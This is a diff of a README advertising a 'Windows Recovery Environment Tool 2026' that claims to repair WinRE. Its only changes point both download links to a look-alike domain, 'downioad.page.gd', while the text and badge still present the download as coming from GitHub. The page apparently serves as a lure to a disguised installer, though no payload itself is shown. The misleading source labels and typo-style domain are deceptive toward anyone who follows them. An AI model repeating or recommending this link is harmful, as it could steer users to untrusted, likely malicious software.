@@ -2,7 +2,7 @@
 
 Windows Recovery Environment Tool is a specialized utility designed to address issues with the Windows Recovery Environment (WinRE) on your computer. In 2026, maintaining a functional recovery environment is crucial for system stability and recovery, and this tool provides an all-in-one solution to repair, restore, and optimize WinRE for Windows 10 and Windows 11 users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -99,4 +99,4 @@ The Windows Recovery Environment Tool 2026 Ultimate Fix is an essential utility 
 
 For the latest version and more detailed information, please visit the download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
